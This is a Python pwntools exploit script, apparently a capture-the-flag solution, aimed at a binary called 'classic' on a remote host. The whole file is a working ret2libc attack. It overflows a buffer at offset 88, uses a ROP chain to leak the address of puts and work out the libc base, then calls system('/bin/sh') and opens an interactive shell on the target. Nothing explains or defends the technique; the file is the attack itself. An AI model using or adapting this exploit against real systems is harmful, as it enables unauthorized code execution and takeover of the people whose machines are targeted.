from pwn import p64
from pwn import *
import sys

REMOTE = "r"
LOCAL = "l"
IP = "141.85.224.104"
PORT = 33337



def exploit(arg : str):

    binary = context.binary = ELF("./classic") 
    elf = ELF("./classic", checksec=False)
    libc = ELF("./libc.so.6")
    ropper = ROP("./classic")

    if arg == LOCAL:
        p = process()

    if arg == REMOTE:
        p = remote(IP, PORT)

    # Handle first input
    print(p.recv().decode())
    p.sendline(b"REEEEEEEEED")

    # Handle second input and send stage 1 payload
    print(p.recv().decode())

    # Get gadgets
    POP_RDI = p64(ropper.find_gadget(['pop rdi', 'ret'])[0])
    FUNC_GOT = p64(elf.got["puts"])
    PUTS_PLT = p64(elf.plt.puts)
    MAIN = p64(0x400657) # Main start

    leak_payload = b"A" * 88 + POP_RDI + FUNC_GOT + PUTS_PLT + MAIN
    p.sendline(leak_payload)

    print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")
    print("[RECEIVE MESSAGE] " + p.recvline().decode())
    print("[RECEIVE MESSAGE]" + p.recvline().decode())
    puts_address = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    print(f"[DEBUG] Puts address is: {hex(puts_address)}")
    
    # Leaked addresses
    libc.address = puts_address - libc.symbols['puts']
    print(f"[DEBUG] Libc address is {hex(libc.address)}")
    
    system_addr = libc.symbols['system']
    print(f"[DEBUG] System address is: {hex(system_addr)}")

    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    print(f"[DEBUG] /bin/sh address {hex(bin_sh_addr)}")

    # Reload program workflow
    print("[RECEIVE MESSAGE]" + p.recv().decode())
    p.sendline(b"REEEEED")
    print("[RECEIVE MESSAGE]" + p.recv().decode())
    binsh_payload = b'A' * 88 + POP_RDI + p64(bin_sh_addr) + p64(system_addr)
    p.sendline(binsh_payload)
    p.interactive()
    
if __name__ == "__main__":
    exploit(sys.argv[1])
